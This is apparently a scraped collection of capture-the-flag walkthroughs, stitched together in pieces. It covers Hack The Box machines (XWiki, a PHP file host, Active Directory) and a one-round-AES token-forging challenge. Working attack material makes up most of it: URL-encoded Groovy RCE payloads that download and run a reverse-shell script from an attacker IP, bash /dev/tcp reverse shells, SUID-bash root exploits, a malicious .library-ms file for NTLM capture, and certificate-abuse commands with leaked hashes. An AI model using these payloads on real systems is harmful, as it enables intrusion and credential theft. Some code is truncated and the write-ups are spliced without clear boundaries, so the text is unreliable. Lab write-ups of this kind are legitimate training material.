items.title: Web Application Analysis
items.text:
Editor (editor.htb:80): - React-based online code editor - No obvious vulnerabilities

XWiki (wiki.editor.htb:8080): - XWiki version 15.10.8 - Solr search functionality at /xwiki/bin/view/Main/SolrSearch

items.title: Understanding the Vulnerability
items.text: CVE-2025-24893 is an unauthenticated remote code execution vulnerability in XWiki's Solr search functionality. The RSS feed generation doesn't properly sanitize input, allowing Groovy script injection.

items.title: Verifying the Vulnerability
items.text:
First, let's confirm the vulnerability with a simple arithmetic test:

# Test payload: {{async}}{{groovy}}println(23+19){{/groovy}}{{/async}}
curl -s "http://wiki.editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(23%2B19)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D" | grep 42

If we see 42 in the response, we have code execution!

items.title: Getting a Shell
items.text:
The payload structure: 

}}}{{async async=false}}{{groovy}}COMMAND{{/groovy}}{{/async}}

Create a reverse shell script:

# Create reverse shell payload
cat > rev.sh << 'EOF'
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
EOF

# Host it
python3 -m http.server 8080

Start listener:

rlwrap nc -lvnp 443

Execute the exploit:

# Payload: Download and execute reverse shell
# Groovy: "curl http://10.10.14.6:8080/rev.sh -o /dev/shm/rev.sh".execute()
# Then: "bash /dev/shm/rev.sh".execute()

# URL encoded payload
curl "http://wiki.editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22curl%20http%3A%2F%2F10.10.14.6%3A8080%2Frev.sh%20-o%20%2Fdev%2Fshm%2Frev.sh%22.execute().text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"

curl "http://wiki.editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20%2Fdev%2Fshm%2Frev.sh%22.execute()%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"

Shell as xwiki!

items.title: Enumeration
items.text:
Looking for SUID binaries and interesting services:

find / -perm -4000 2>/dev/null

Found /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo - a SetUID binary owned by root!

items.title: CVE-2024-32019 - NetData ndsudo PATH Injection
items.text: The ndsudo binary is part of NetData v1.45.2 and has a PATH injection vulnerability. It executes certain commands (like nvme) without using absolute paths.

items.title: Understanding the Vulnerability
items.text:
When we run: 

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

The binary searches for nvme in the PATH environment variable. Since we control PATH, we can make it execute our malicious binary instead!

items.title: Creating the Exploit
items.text:
// exploit.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);
    system("cp /bin/bash /tmp/pwned; chown root:root /tmp/pwned; chmod 6777 /tmp/pwned");
    return 0;
}

Compile and deploy:

# On attacker machine
gcc -o nvme exploit.c

# Transfer to target
python3 -m http.server 8080

# On target
cd /dev/shm
curl http://10.10.14.6:8080/nvme -o nvme
chmod +x nvme

items.title: Triggering the Exploit
items.text:
# Set PATH to include our directory first
PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

The ndsudo binary runs as root (SUID), finds our nvme in /dev/shm, and executes it with root privileges!

items.title: Getting Root
items.text:
/tmp/pwned -p

pwned-5.1# whoami
root

Root flag!

items.title: Summary
items.text:
Step From To Technique 1 Anonymous xwiki CVE-2025-24893 Groovy RCE 2 xwiki oliver Password reuse from config 3 oliver root CVE-2024-32019 ndsudo PATH injection

This box demonstrates a clean attack chain through a recent XWiki vulnerability to a lesser-known NetData privilege escalation. The password reuse between database and SSH is a common real-world finding.

Key takeaways: - Always keep XWiki and similar applications updated - Database passwords should never be reused for system accounts - SetUID binaries that don't use absolute paths are dangerous - PATH injection is a classic but still effective technique

Thanks for reading!

items.title: Web Application Analysis
items.text:
Era (era.htb): - Static website with company information - Nothing interesting

File Hosting (file.era.htb): - PHP file hosting application - User registration and login - File upload and download functionality - Download via /download.php?id=X

items.title: Discovering the Vulnerability
items.text:
After registering an account on file.era.htb, I noticed the download functionality uses sequential IDs. Let's fuzz for other users' files:

ffuf -u "http://file.era.htb/download.php?id=FUZZ" \
  -w <(seq 1 200) -H "Cookie: PHPSESSID=YOUR_SESSION" \
  -fs 0

Found two interesting files: - ID 54: site-backup-30-08-24.zip - ID 150: signing.zip

items.title: Downloading the Files
items.text:
curl -b "PHPSESSID=YOUR_SESSION" "http://file.era.htb/download.php?id=54" -o site-backup.zip
curl -b "PHPSESSID=YOUR_SESSION" "http://file.era.htb/download.php?id=150" -o signing.zip

items.title: Analyzing the Backup
items.text:
unzip site-backup.zip

The backup contains a SQLite database with user credentials:

sqlite3 filedb.sqlite "SELECT * FROM users;"

1|admin_ef01cab31aa|$2b$12$...|admin@era.htb|...
2|eric|$2b$12$...|eric@era.htb|...
3|yuri|$2b$12$...|yuri@era.htb|...
...

items.title: Cracking the Hashes
items.text:
# Extract hashes
sqlite3 filedb.sqlite "SELECT username, password FROM users;" > hashes.txt

# Crack with hashcat (bcrypt)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

eric:america
yuri:mustang

Store the credentials:

exh add creds -d era.htb -u eric -p 'america'
exh add creds -d era.htb -u yuri -p 'mustang'

items.title: Security Question Vulnerability
items.text: The application has a password reset feature via security questions at /reset.php. However, there's a critical flaw: any authenticated user can update the security questions for ANY username!

items.title: Exploiting the Flaw
items.text:
1. Login with eric:america
  2. Navigate to /reset.php
  3. Enter admin_ef01cab31aa as the username
  4. Set new security questions with known answers
  5. Logout and use /security_login.php to login as admin
# Set security questions for admin
curl -X POST "http://file.era.htb/reset.php" \
  -b "PHPSESSID=YOUR_SESSION" \
  -d "username=admin_ef01cab31aa&question1=test&answer1=test&question2=test&answer2=test"

# Login as admin via security questions
curl -X POST "http://file.era.htb/security_login.php" \
  -d "username=admin_ef01cab31aa&answer1=test&answer2=test"

Now we have admin access to the file hosting application!

items.title: PHP SSH2 Wrapper Abuse
items.text:
As admin, I discovered that /download.php has additional parameters: show and format. After some testing, I found it's vulnerable to PHP stream wrapper injection.

The application has the PHP SSH2 module installed, which allows us to use the ssh2.exec:// wrapper to execute commands via SSH!

items.title: Building the Payload
items.text:
The key insight: we have valid SSH credentials (yuri:mustang) and can use the SSH2 wrapper to execute commands:

ssh2.exec://yuri:mustang@localhost:22/COMMAND

items.title: Getting a Shell
items.text:
# Start listener
rlwrap nc -lvnp 443

URL-encode and send the payload:

# Payload: bash -i >& /dev/tcp/10.10.14.6/443 0>&1
curl "http://file.era.htb/download.php?show=ssh2.exec://yuri:mustang@localhost:22/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%22%20%23&format=raw" \
  -b "PHPSESSID=ADMIN_SESSION"

Shell as eric!

Note: eric is member of the devs group, which will be important for privilege escalation.

items.title: Identifying the Target
items.text:
Enumeration reveals a binary /opt/AV/periodic-checks/monitor executed by root via cron:

cat /etc/crontab

* * * * * root /opt/AV/periodic-checks/monitor

The binary has an interesting .text_sig section containing a PKCS#7 digital signature. The system verifies the signature before execution!

Most importantly, the binary is writable by the devs group - which eric is a member of!

items.title: Recovering the Signing Key
items.text: Remember signing.zip from the IDOR? It contains: - key.pem - Private signing key - cert.pem - Certificate - Configuration files

items.title: Creating a Malicious Binary
items.text:
// exploit.c
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/pwned && chmod 6777 /tmp/pwned");
    return 0;
}

# Compile
gcc -o monitor exploit.c

items.title: Signing the Binary
items.text:
Using linux-elf-binary-signer:

# Sign our malicious binary
./linux-elf-binary-signer -k key.pem -c cert.pem -i monitor -o monitor_signed

items.title: Replacing the Binary
items.text:
# Backup original
cp /opt/AV/periodic-checks/monitor /opt/AV/periodic-checks/monitor.bak

# Replace with our signed malicious version
cp monitor_signed /opt/AV/periodic-checks/monitor

Wait for cron to execute, then:

/tmp/pwned -p

Root flag!

items.title: Summary
items.text:
Step From To Technique 1 Anonymous Files IDOR file enumeration 2 Hashes Creds Hashcat bcrypt cracking 3 User Admin Security question reset bypass 4 Admin eric PHP SSH2 wrapper RCE 5 eric root Signed binary replacement

This box demonstrates a realistic attack chain combining web vulnerabilities with Linux privilege escalation. The IDOR leading to credential disclosure, authentication bypass via logic flaws, and the creative use of PHP's SSH2 wrapper make this an excellent learning experience.

Key takeaways: - Always implement proper authorization checks (IDOR prevention) - Security question reset should verify current authentication - PHP stream wrappers can be dangerous if not restricted - Binary signature verification is only as secure as the key storage

Thanks for reading!

items.title: Understanding the Vulnerability
items.text: CVE-2025-24071 (also known as CVE-2025-24054) exploits Windows' handling of .library-ms files within ZIP archives. When Windows Explorer processes these files, it automatically attempts NTLM authentication to the specified server.

items.title: Creating the Malicious Payload
items.text:
# Create the malicious library-ms file
cat > @exploit.library-ms << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.6\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF

# Create ZIP archive (the @ prefix ensures it's processed first)
zip exploit.zip @exploit.library-ms

items.title: Capturing the Hash
items.text:
# Start Responder
sudo responder -I tun0 -v

Upload the ZIP to the IT share:

smbclient //$IP/IT -U "$USER%$PASSWORD" -c "put exploit.zip"

Wait for a user to browse the share... Got a hash!

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:...

items.title: Understanding ESC16
items.text: ESC16 occurs when the CA has the "Security Extension" (szOID_NTDS_CA_SECURITY_EXT) globally disabled. This extension normally includes the requester's SID in issued certificates. Without it, we can request certificates that impersonate other users!

items.title: Enumerating ADCS
items.text:
certipy find -u "$USER@$DOMAIN" -hashes ":$HASH" -dc-ip $IP -vulnerable

The output shows: - CA: fluffy-DC01-CA - ESC16: Security Extension is disabled - ca_svc is member of Cert Publishers (can enroll)

items.title: Getting ca_svc Hash
items.text:
First, we need ca_svc credentials. From BloodHound, Service Accounts has GenericWrite over ca_svc too:

certipy shadow auto -u winrm_svc@$DOMAIN -hashes ":33bd09dcd697600edf6b3a7af4875767" \
  -account ca_svc -dc-ip $IP

[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8

exh add creds -d $DOMAIN -u ca_svc -H 'ca0f4f9e9eb8a092addf53bb03fc98c8'

items.title: Exploiting ESC16
items.text:
The attack: 1. Modify ca_svc's UPN to administrator 2. Request a User certificate as ca_svc 3. The certificate will be issued with administrator's identity (no SID check!) 4. Authenticate with the certificate

# Step 1: Change ca_svc UPN to administrator
bloodyAD -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767' --host $IP -d $DOMAIN \
  set object ca_svc userPrincipalName -v 'administrator@fluffy.htb'

# Step 2: Request certificate as ca_svc (impersonating administrator)
certipy req -u ca_svc@$DOMAIN -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' \
  -ca fluffy-DC01-CA -template User -dc-ip $IP

# Step 3: Authenticate with the certificate
certipy auth -pfx ca_svc.pfx -dc-ip $IP

[*] Using principal: administrator@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

exh add creds -d $DOMAIN -u Administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'

items.title: Summary
items.text:
Step From To Technique 1 j.fleischman p.agila CVE-2025-24071 NTLM capture 2 p.agila winrm_svc GenericAll + Shadow Credentials 3 winrm_svc ca_svc GenericWrite + Shadow Credentials 4 ca_svc Administrator ESC16 UPN manipulation

This box showcases modern Active Directory attack techniques including the recent CVE-2025-24071 for initial access and ESC16 for privilege escalation. The chain through group memberships and shadow credentials is a realistic attack path.

Key takeaways: - SMB shares with write access can be abused for NTLM capture - CVE-2025-24071 requires no user interaction beyond browsing a folder - Shadow Credentials are powerful when you have GenericWrite - ESC16 can be devastating when Security Extension is disabled - Always patch your ADCS and enable security extensions!

Thanks for reading!

items.text:

items.title: Summary
items.text:
Step From To Technique 1 levi.james DEVELOPERS GenericWrite group abuse 2 DEVELOPERS ant.edwards KeePass cracking + password spray 3 ant.edwards adam.silver GenericAll + account enable 4 adam.silver steph.cooper Backup file with hardcoded creds 5 steph.cooper steph.cooper_adm DPAPI credential decryption 6 steph.cooper_adm Domain Admin Already admin!

This box is a great example of how AD privilege escalation works in practice. The chain through group permissions, KeePass databases, backup files with credentials, and DPAPI abuse represents realistic attack paths seen in real-world engagements.

Key takeaways: - GenericWrite on groups allows adding members - KeePass databases with weak master passwords are a goldmine - Backup files often contain sensitive credentials - DPAPI can decrypt saved Windows credentials if you have the user's password - Always check for stored credentials in the user's profile!

Thanks for reading!

items.title: BloodHound Analysis
items.text:
For this box, I used RustHound-CE because it also collects ADCS data (which will be crucial later):

rusthound-ce -d $DOMAIN -u "$USER" -p "$PASSWORD" -i $IP --adcs --zip

Import the zip into BloodHound CE and analyze the attack paths.

Key findings: - Only 4 non-default domain users: henry, alfred, sam, john - 11 certificate templates enabled - Long privilege escalation chain from henry to Administrator

The attack path is quite long but clear: 1. henry → WriteSPN → alfred 2. alfred → AddSelf → Infrastructure group → ReadGMSAPassword → ANSIBLE_DEV$ 3. ANSIBLE_DEV$ → ForceChangePassword → sam 4. sam → WriteOwner → john 5. john → GenericAll on ADCS OU → recover cert_admin from Recycle Bin 6. cert_admin → ESC15 → Administrator

Let's go step by step.

items.title: Henry → Alfred (Targeted Kerberoasting)
items.text:
BloodHound shows that henry has WriteSPN permission over alfred. This is perfect for a targeted Kerberoasting attack!

The idea: 1. Add an SPN (Service Principal Name) to alfred's account 2. Request a TGS ticket for that SPN 3. The ticket is encrypted with alfred's password hash 4. Crack it offline

items.title: Adding the SPN
items.text:
bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN set object alfred servicePrincipalName -v 'HTTP/pwned.tombwatcher.htb'

exh add creds -d $DOMAIN -u alfred -p 'basketball'

items.title: cert_admin → Administrator (ESC15)
items.text: Now for the final boss: ESC15 (CVE-2024-49019). This is a relatively new ADCS vulnerability from late 2024.

items.title: Enumerating Vulnerable Templates
items.text:
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip $IP -vulnerable

The WebServer template is vulnerable: - Schema Version 1 (no Application Policies enforcement) - Enrollee supplies subject - We can set our own Application Policies

items.title: The Attack
items.text: ESC15 works like this: 1. Request a certificate with the "Certificate Request Agent" Application Policy 2. Use that certificate to request another certificate on behalf of Administrator 3. Authenticate as Administrator

items.title: Initial Reconnaissance
items.text:
When I opened this challenge, I got server.py and a Docker setup with an IP:port to connect to. The first thing I noticed: utils.py is imported but not provided. That's immediately suspicious - they're hiding something.

Looking at the imports: 

from utils import _msc, _ek, b2m, m2b, B

These look like obfuscated crypto functions. The challenge name "Disguised" and the description mentioning "snowy protections" hint at a weakness in this custom cipher.

items.title: Understanding the Server Code
items.text:
Here's the full server.py:

server.py 
import json, hashlib, os
from utils import _msc, _ek, b2m, m2b, B
from Crypto.Util.Padding import pad

class HearthProtocol:
    def __init__(self, cipher):
        self.cipher = cipher
        self.admin_uid = 0
        self.uid = 1

    def login(self, uid, username, token):
        snowprint = hashlib.shake_256(self.cipher.KEY + username + str(uid).encode()).digest(64)
        real_token = self.cipher.encrypt(json.dumps({"s": snowprint.hex(), "i": uid}).encode())
        if real_token == token:
            if uid == self.admin_uid and username == b'TinselwickAdmin':
                return { "success": f"Warm greetings, admin! Your Starshard scroll: {open('flag.txt').read()}" }
            else:
                return { "success": f"Welcome {username.decode()}! No Starshard scrolls for you today." }
        else:
            return { "error": "Frostbitten session token. Identity unclear." }

    def register(self, username):
        if self.uid >= 32:
            return { "error": "The Hearth Registry is full for now... try again after the solstice." }
        snowprint = hashlib.shake_256(self.cipher.KEY + username + str(self.uid).encode()).digest(64)
        token = self.cipher.encrypt(json.dumps({"s": snowprint.hex(), "i": self.uid}).encode())
        self.uid += 1
        return { "token": token.hex() }

class SnowCipher:
    def __init__(self, key):
        self.KEY = key

    def _sb(self, s, b=B):
        return [[b[val] for val in row] for row in s]

    def _sr(self, s):
        res = [s[i].copy() for i in range(4)]
        res[0][1], res[1][1], res[2][1], res[3][1] = res[1][1], res[2][1], res[3][1], res[0][1]
        res[0][2], res[1][2], res[2][2], res[3][2] = res[2][2], res[3][2], res[0][2], res[1][2]
        res[0][3], res[1][3], res[2][3], res[3][3] = res[3][3], res[0][3], res[1][3], res[2][3]
        return res

    def _mc(self, s):
        return [_msc(s[i].copy()) for i in range(4)]

    def _ark(self, s, k):
        return [[t[0] ^ t[1] for t in list(zip(row[0], row[1]))] for row in zip(s, k)]

    def encrypt_block(self, block):
        rk = _ek(self.KEY)
        s = b2m(block)
        s = self._ark(s, rk[0])
        s = self._sb(s)
        s = self._sr(s)
        s = self._mc(s)
        s = self._ark(s, rk[1])
        return m2b(s)

    def encrypt(self, m):
        plaintext = pad(m, 16)
        return b''.join(self.encrypt_block(plaintext[i:i+16]) for i in range(0, len(plaintext), 16))

prot = HearthProtocol(SnowCipher(os.urandom(32)))

while True:
    print("[1] Request Hearth Token")
    print("[2] Authenticate with Hearth Token")
    print("[3] Leave Frostgate")

    choice = input("> ").strip()

    if choice == "1":
        username = input("Enter username: ").strip().encode()
        response = prot.register(username)
    elif choice == "2":
        try:
            uid = int(input("Enter UID: ").strip())
        except ValueError:
            print('[-] UID must be numeric.')
            continue
        username = input("Enter username: ").strip().encode()
        token_hex = input("Enter token (hex): ").strip()
        token = bytes.fromhex(token_hex)
        response = prot.login(uid, username, token)
    elif choice == "3":
        print("The Frostgate closes... stay warm.")
        break
    else:
        print("Try a valid option, snowflake.")
        continue

    print(json.dumps(response))

items.title: What the code tells us
items.text:
The goal is clear: - To get the flag, we need uid=0 and username=TinselwickAdmin - But registration starts at uid=1 - we can't register as admin - We need to forge a valid admin token

The token structure: 

{"s": "...128 hex chars (64 bytes)...", "i": UID}

The snowprint is SHAKE256(KEY + username + uid) - we can't compute it without the key.

The cipher (SnowCipher): Looking at encrypt_block(), even with obfuscated function names, the structure is recognizable: - _ark = AddRoundKey (XOR with key) - _sb = SubBytes (S-box substitution) - _sr = ShiftRows - _mc = MixColumns

This is basically 1 round of AES! Standard AES uses 10 rounds - this is severely weakened.

items.title: The Key Insight
items.text:
Looking at the token structure, I realized something crucial: even though we don't know the encryption implementation, the last block of the message is predictable.

The encrypted message is a JSON: 

{"s": "...128 hex chars...", "i": UID}

With PKCS#7 padding (16-byte blocks), for certain UIDs the last block is entirely deterministic:

UID Message length Last block (16 bytes) 9 143 bytes } + 0x0f × 15 10 144 bytes 0} + 0x0e × 14

The snowprint (128 hex chars) doesn't affect the last block at all - it's just the closing brace and padding!

This gives us known plaintext-ciphertext pairs for the last block.

items.title: Quick Crypto Refresher
items.text:
If you're not familiar with AES internals, here's a quick overview:

Operation What it does Key property SubBytes Replaces each byte using a lookup table (S-box) Non-linear ShiftRows Rotates rows of the 4×4 state matrix Shuffles bytes MixColumns Matrix multiplication on each column Linear AddRoundKey XOR with the round key Linear

SubBytes: Each byte is substituted using the S-box

ShiftRows: Each row is rotated left by different amounts

MixColumns: Linear mixing within columns

The crucial property: MixColumns is linear. If we XOR two ciphertexts, the round key cancels out!

items.title: The Attack Strategy
items.text:
With the known plaintext-ciphertext pairs, I could now work out the math:

Encryption flow: 

Plaintext → XOR(rk0) → SubBytes → ShiftRows → MixColumns → XOR(rk1) → Ciphertext

With two known plaintext-ciphertext pairs (P1/C1 and P2/C2), if we XOR the ciphertexts: 

C1 ⊕ C2 = MixColumns(ShiftRows(SubBytes(P1 ⊕ rk0))) ⊕ MixColumns(ShiftRows(SubBytes(P2 ⊕ rk0)))

The rk1 cancels out! And since MixColumns is linear, we get an equation where only rk0 is unknown.

Why we can't just brute-force: - Brute-forcing 16 bytes of rk0 = $2^{128}$ operations = impossible

But here's the trick: 1. ShiftRows separates bytes into 4 independent groups 2. Each group only depends on 4 bytes of key

So instead of $2^{128}$, we attack each group with $2^{32}$ possibilities.

But $2^{32}$ per group is still slow. Enter Meet-in-the-Middle.

items.title: Meet-in-the-Middle Attack
items.text:
For each 4-byte group, instead of testing $2^{32}$ possibilities:

  1. Split the 4 bytes into 2 halves (2 bytes each)
  2. Precompute all $2^{16}$ left-half results → store in hash table
  3. Scan all $2^{16}$ right-half possibilities → lookup matches

This reduces $2^{32}$ to $2^{16} + 2^{16} = 2^{17}$ operations per group.

Total complexity: 4 groups × $2^{17}$ = $2^{19}$ ≈ 500,000 operations - runs in seconds!

items.title: Why My First Script Failed
items.text:
My first implementation returned 0 candidates. The math was correct, but something was wrong with the byte mapping.

The problem: I didn't know how b2m() and m2b() (from the hidden utils.py) arrange bytes in the 4×4 matrix. There are two conventions: - Column-major: bytes fill columns first (standard AES) - Row-major: bytes fill rows first

Also, MixColumns could operate on the outer or inner axis of the matrix.

items.title: The Fix: Auto-Derive the Mapping
items.text:
Instead of guessing the mapping, I came up with a better approach: auto-derive it from the server's ShiftRows.

The idea: 1. Create a label matrix [(i,j) for all positions] 2. Apply the server's exact _sr() function to it 3. See which 4 original positions end up in each mixed vector 4. Test all 4 variants: (mode=col/row) × (mix_axis=i/j)

Only one combination produces candidates → that's the correct interpretation!

items.title: Final Attack Flow
items.text:
1. Connect to server, register 11 users (same session)
  2. Get tokens for UID 9, 10, 11
  3. Use UID 9 vs 10 last blocks for MITM attack
  4. Validate recovered key against UID 11's full token
  5. Compute admin snowprint with the recovered key
  6. Forge admin token and login

def mul2(x: int) -> int:

    return (((x << 1) ^ 0x1b) if (x & 0x80) else (x << 1)) & 0xff

    """Multiply by 3 in GF(2^8)"""
    return mul2(x) ^ x

def mixcol(v: List[int]) -> List[int]:
    """Standard AES MixColumns on a 4-byte vector"""
    a0, a1, a2, a3 = v
    return [
        mul2(a0) ^ mul3(a1) ^ a2 ^ a3,
        a0 ^ mul2(a1) ^ mul3(a2) ^ a3,
        a0 ^ a1 ^ mul2(a2) ^ mul3(a3),
        mul3(a0) ^ a1 ^ a2 ^ mul2(a3),

# State packing hypotheses (we try both)
def b2m(block16: bytes, mode: str) -> List[List[int]]:
    s = [[0]*4 for _ in range(4)]
    for i, b in enumerate(block16):
        s[i // 4][i % 4] = b

def m2b(s: List[List[int]], mode: str) -> bytes:

    if mode == "col":
        for c in range(4):

            # Step 4: Validate against UID 11
            test_uid = 11
            test_token = tokens[test_uid]

            for combo in product(*all_cands):
                rk0 = [[0]*4 for _ in range(4)]
                rk1 = [[0]*4 for _ in range(4)]

                for idx in range(4):
                    k0_4, rk1v = combo[idx]
                    for t, (i, j) in enumerate(groups[idx]):
                        rk0[i][j] = k0_4[t]
                    if axis == "i":
                        for t in range(4):
                            rk1[idx][t] = rk1v[t]
                    else:
                        for t in range(4):
                            rk1[t][idx] = rk1v[t]

                key = m2b(rk0, mode) + m2b(rk1, mode)

                # Verify on full token
                snow = hashlib.shake_256(key + username + str(test_uid).encode()).digest(64).hex()
                plain = json.dumps({"s": snow, "i": test_uid}).encode()

                if encrypt_local(plain, rk0, rk1, mode, axis) == test_token:
                    print(f"\n[+] KEY FOUND: {key.hex()}")

                    # Step 5: Forge admin token!
                    admin_user = b"TinselwickAdmin"
                    admin_uid = 0
                    snow_admin = hashlib.shake_256(key + admin_user + b"0").digest(64).hex()
                    plain_admin = json.dumps({"s": snow_admin, "i": admin_uid}).encode()
                    token_admin = encrypt_local(plain_admin, rk0, rk1, mode, axis)

                    print(f"[+] Forged admin token: {token_admin.hex()}")

                    resp, _ = login(sock, buf, admin_uid, admin_user, token_admin)
                    print(resp)

                    m = re.search(r"HTB\{.*?\}", resp)
                    if m:
                        print(f"\n[+] FLAG: {m.group(0)}")
                    sock.close()
                    return

            print("[-] Candidates existed but none validated.")

    sock.close()
    print("\n[-] No variant solved.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} HOST PORT")
        sys.exit(1)
    solve(sys.argv[1], int(sys.argv[2]))

items.title: Key Takeaways
items.text:
1. Reduced-round ciphers are broken - 1 round of AES provides no security
  2. Deterministic padding leaks plaintext - The last block was entirely predictable
  3. MixColumns linearity is exploitable - XOR of ciphertexts cancels the key
  4. ShiftRows creates independence - 4 groups can be attacked separately
  5. Meet-in-the-Middle is powerful - Reduces $2^{32}$ to $2^{17}$
  6. Auto-derive unknown mappings - Don't guess, test all variants
